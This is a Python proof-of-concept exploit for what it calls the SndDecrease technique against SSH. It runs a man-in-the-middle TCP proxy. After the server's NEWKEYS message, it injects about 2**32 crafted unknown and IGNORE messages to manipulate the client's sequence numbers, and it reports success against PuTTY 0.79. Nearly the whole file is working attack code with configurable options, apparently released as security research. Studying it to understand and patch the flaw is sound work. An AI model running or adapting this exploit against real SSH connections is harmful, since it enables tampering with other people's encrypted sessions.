#!/usr/bin/python3
from binascii import unhexlify
from time import sleep

import click
from tqdm import trange

from common import contains_newkeys, run_tcp_mitm

#####################################################################################
## Proof of Concept for the SndDecrease technique                                  ##
##                                                                                 ##
## Tested successfully against:                                                    ##
## - PuTTY 0.79 (OpenSSH 9.4p1 Server)                                             ##
##                                                                                 ##
## Tested unsuccessfully:                                                          ##
## - AsyncSSH / libssh (Timeouts)                                                  ##
## - OpenSSH (Wrap-Around Detection)                                               ##
## - dropbear (Disconnect on unknown message)                                      ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

rogue_unknown_msg_hex = '0000000C06{}00000000000000000000'
rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
technique_in_progress = False

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the SSH server is running.")
@click.option("--server-port", default=22, help="The port where the SSH server is running.")
@click.option("-N", "--decrease-by", default=1, help="The number by which C.Snd will be decreased.")
@click.option("--unknown-id", default="09", help="The message ID (in hex) of a message unknown to the implementation")
def cli(proxy_ip, proxy_port, server_ip, server_port, decrease_by, unknown_id):
    print("--- Proof of Concept for SndDecrease technique ---", flush=True)
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.", flush=True)
    rogue_unknown_msg = unhexlify(rogue_unknown_msg_hex.format(unknown_id))
    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_snddecrease(in_socket, out_socket, decrease_by, rogue_unknown_msg), forward_client_to_server=pipe_discard_during_technique)

def inject_snddecrease(in_socket, out_socket, decrease_by, rogue_unknown_msg):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
                technique_in_progress = True
                print(f"[+] Injecting 2**32 - {decrease_by} unknown messages to decrease C.Snd by {decrease_by}!", flush=True)
                for _ in trange(2**32 - decrease_by):
                    out_socket.send(rogue_unknown_msg)
                print(f"[+] Injecting {decrease_by} SSH_MSG_IGNORE to fix C.Rcv!", flush=True)
                for _ in trange(decrease_by):
                    out_socket.send(rogue_msg_ignore)
                print("[+] Injection done, cooling down before continuing to forward traffic.", flush=True)
                # Rough workaround to avoid forwarding any unimplemented messages to the server
                sleep(3)
                technique_in_progress = False
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
    in_socket.close()
    out_socket.close()

def pipe_discard_during_technique(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            # Rough but good enough for a PoC.
            # This may drop valid messages send by the client. However, since the server sends the key exchange reply
            # and new keys together, it is very unlikely that the key exchange has completed yet.
            if not technique_in_progress:
                out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    cli()
